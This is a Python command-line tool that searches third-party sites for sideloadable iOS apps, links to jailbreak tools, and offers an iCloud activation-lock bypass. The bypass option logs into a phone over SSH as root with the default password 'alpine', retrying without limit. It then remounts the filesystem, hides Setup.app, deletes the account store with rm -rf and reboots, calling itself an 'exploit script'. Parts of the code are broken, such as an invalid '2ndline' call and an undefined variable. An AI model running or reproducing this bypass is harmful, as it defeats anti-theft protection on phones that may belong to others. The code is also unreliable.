import requests
import json
from time import sleep
from colorama import Fore, init
import os , sys
import subprocess
import paramiko

def ketik(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 1000)

os.system('clear')

red_color = "\033[1;31m"
info_color = "\033[1;33m"
detect_color = "\033[1;34m"
end_banner_color = "\33[00m"

print (detect_color + '''


               `y/+y                              
           .y`/s ds`y--y                          
           .hNMMMMMMMMmh                          
             mMMMMMMMMy                           
              oMMMMMM/                            
              oMMMMMM:                            
          -::mMMMMMMMMd::.                        
          -//NMMMMMMMMd//.                        
   .::`      mMMMMMMMMy                           
   +MMdyyy:  mMMMMMMMMy       `y.                 
   +Mh++hMdhMMMMMMMMMMd:::::::+M+.   .::hmy`      
   +My++y/os/NMMMMMMMMd/MyoM+hN/mmyyydM/dNy`      
   +M/ss/yo+yNMMMMMMMMmy/os/ymm         yd/:ym:`  
   +M/ss/yo+yNMMMMMMMMmy/os/smm         ym//hm/`  
   +My++y/os/NMMMMMMMMd/NsoM+hm:mmyyydM:hNy`      
   +My++yMdhMMMMMMMMMMMM//////+Mo-   .//dNy`      
   +MMdyhh:-MMMMMMMMMMMM      .h.                 
   .//.   /hMMMMMMMMMMMMy:                        
          sMMMMMMMMMMMMMM+                        
         smMMMMMMMMMMMMMMdo                       
         yhhhhhhhhhhhhhhhho                       

''')
print (end_banner_color + '''
==============================================
[developer] => FaLaH - 0xfff0800 [developer_email] => flaaah777@gmail.com ) 
[developer_snapchat] => flaah999
==============================================

''')

falah = input (end_banner_color + '''
1 - Search for an application
2 - Search for an application ++
3 - Install the app from ssh - pc 
4 - Download the jailbreak - pc 
5 - iCloud Locked Iphone ( A7 - A12 )
-> 1''')
if falah == "1":
    dd = 2ndline('App name  > 2ndline ')
    url = "https://apiv2.iphonecake.com/appcake/appcake_api/spv6/appsearch_r.php?device=1&q=" + dd + "&p=0"
    payload = ""
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "User-Agent": "appcakej/7.0.4 (iPhone; iOS 13.6.1; Scale/3.00)",
        "Connection": "close",
        "Host": "apiv2.iphonecake.com",
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "max-age=0"

    }

    response = requests.request ("POST", url, data=payload, headers=headers)
    for i in range (5):
           try:
	            print ("")
	            print ("")
	            print ('Application image :',  str (response.json ()["list"][i]["icon"]))
	            print ("")
	            print ('Application name :',  str (response.json ()["list"][i]["name"]), str (response.json ()["list"][i]["ver"]))
	            print ("")
	            print ('Application id :',  str (response.json ()["list"][i]["id"]))
	            print (" -" * 15)
	            print ("")
           except:
	            print ("No other application found")

				
    flo = input ('id app > ')
    url = "https://apiv2.iphonecake.com/appcake/appcake_api/ipastore_ios_link.php?type=1&id=" + flo + ""
    payload = ""
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "User-Agent": "appcakej/7.0.4 (iPhone; iOS 13.6.1; Scale/3.00)",
        "Connection": "close",
        "Host": "apiv2.iphonecake.com",
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "max-age=0"

    }

    response = requests.request ("GET", url, data=payload, headers=headers)
    post = str (response.json ()["link"])
    print (" -" * 15)
    print ("")
    print (info_color + '-- > download ipa : ', post)
    print ("")
    exit ()
if falah == "5":
    print('==============================================')
    print(detect_color + '''
     Connect your phone to the same Wi-Fi network as the computer
     The default password root ( alpine ) -> If changed, write it in the required field
         
         - password default : alpine
         - ip iphone : Go to the phone's Wi-Fi and type ip
    
    ''')
    falah3 = input (end_banner_color+'ip Iphone -> ')
    falah2 = input("password root -> ")
    if len(falah2) > 0:
        print (' ')
        ketik (
            "\033[1;33m Please jailbreak the phone to access all the root features....\033[1;33m")
        sleep (0.5)

    else:
        print('')
        print(red_color+"It cannot be left blank")
    print(end_banner_color +'==============================================')
    RPORT = 22
    password = ""+falah2+""

    ssh = paramiko.SSHClient ()
    ssh.set_missing_host_key_policy (paramiko.AutoAddPolicy ())
    print ("Initiating SSH connection")
    while True:
        try:
            ssh.connect (''+falah3+'', username='root', password=password)
            break
        except:
            print ("Failed, retrying")
            continue
    print ("Connection established")
    ketik (
            "\033[1;33m ok....\033[1;33m")
    print ("Mounting filesystem as read/write")
    ketik (
            "\033[1;33m ok....\033[1;33m")
    ssh.exec_command ("mount -o rw,union,update /")
    print ("Cleaning mount_rw file")
    ketik (
            "\033[1;33m ok....\033[1;33m")
    ssh.exec_command ('echo "" > /.mount_rw')
    print ("Hiding Setup.app")
    ketik (
            "\033[1;33m ok....\033[1;33m")
    ssh.exec_command ("mv /Application/Setup.app /Application/Setup.app.backup")
    print ("Clearing UI cache")
    ketik (
            "\033[1;33m ok....\033[1;33m")
    ssh.exec_command ("uicache --all")
    print ("Clearing iCloud user")
    ketik (
            "\033[1;33m ok....\033[1;33m")
    ssh.exec_command ("rm -rf /var/mobile/Library/Accounts/*")
    print ("Respringing device")
    ketik (
            "\033[1;33m ok....\033[1;33m")
    ssh.exec_command ("killall backboardd")
    print ("Finishing exploit script")
    ketik (
            "\033[1;33m ok....\033[1;33m")
    print ("Restarting your device")
    ketik (
            "\033[1;33m ok....\033[1;33m")
    ssh.exec_command ("reboot")
    ketik (
            "\033[1;33m ok....\033[1;33m")
    exit()


if falah == "2":
    dd = input ('App name  > ')
    url = "https://api.ipahub.com/search_tweaks.php?key=" + dd + ""
    payload = ""
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "User-Agent": "appcakej/7.0.4 (iPhone; iOS 13.6.1; Scale/3.00)",
        "Connection": "close",
        "Host": "api.ipahub.com",
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "max-age=0"

    }

    response = requests.request ("POST", url, data=payload, headers=headers)
    for i in range (5):
           try:
	            print ("")
	            print (" -" * 15)
	            print ("")
	            print ('Application image :',  str (response.json ()["list"][i]["icon"]))
	            print ("")
	            print ('Application name :',  str (response.json ()["list"][i]["name"]), str (response.json ()["list"][i]["ver"]))
	            print ("")
	            print ('Application id :',  str (response.json ()["list"][i]["id"]))
	            print (" -" * 15)
	            print ("")
           except:
	            print ("No other application found")
    flo = input ('id app > ')
    url = "https://apiv2.iphonecake.com/appcake/appcake_api/ipastore_ios_link.php?type=2&id=" + flo + ""
    payload = ""
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "User-Agent": "appcakej/7.0.4 (iPhone; iOS 13.6.1; Scale/3.00)",
        "Connection": "close",
        "Host": "apiv2.iphonecake.com",
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "max-age=0"

    }

    response = requests.request ("GET", url, data=payload, headers=headers)
    post = str (response.json ()["link"])
    print (" -" * 15)
    print ("")
    print (info_color + '-- > download ipa : ', post)
    print ("")
    exit ()
if falah == "3":
    print ('')
    os.startfile ('C:\Windows\system32\cmd.exe')
    print ('')
    exit ()
if falah == "4":
    print ('''

        1 -> Jailbreak checkra1n 
        2 -> Jailbreak unc0ver 
        ''')
    flo = input ("-> ")
if flo == '1':
    print ('')
    print ('Jailbreak for iPhone 5s through iPhone X, iOS 12.0 and up')
    print ('https://checkra.in - الموقع الرسمي تنزيله')
    print ('https://zeejb.com/steps-to-checkra1n-jailbreak-windows-and-mac - شرح تثبيته')

if flo == '2':
    print ('')
    print ('The most advanced Jailbreak tool iOS 11.0 - 14.3')
    print ('https://unc0ver.dev - تنزيله مع الشرح من الموقع الرسمي')
